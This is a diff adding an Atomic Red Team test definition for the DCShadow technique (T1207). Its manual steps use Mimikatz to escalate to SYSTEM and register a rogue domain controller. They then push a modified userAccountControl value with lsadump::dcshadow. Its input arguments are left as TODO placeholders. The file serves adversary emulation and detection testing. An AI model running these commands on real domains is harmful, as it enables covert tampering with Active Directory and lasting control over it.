@@ -1,0 +1,28 @@
+---
+attack_technique: T1207
+display_name: DCShadow
+
+atomic_tests:
+- name: DCShadow - Mimikatz
+  description: |
+    Utilize Mimikatz DCShadow method to simulate behavior of a Domain Controller
+
+    [DCShadow](https://www.dcshadow.com/)
+    [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    output_file:
+      description: TODO
+      type: todo
+      default: TODO
+
+  executor:
+    name: manual
+    steps: |
+      1. Start Mimikatz and use !processtoken (and not token::elevate - as it elevates a thread) to escalate to SYSTEM.
+      2. Start another mimikatz with DA privileges. This is the instance which registers a DC and is used to "push" the attributes.
+      3. lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value:532480
+      4. lsadump::dcshadow /push
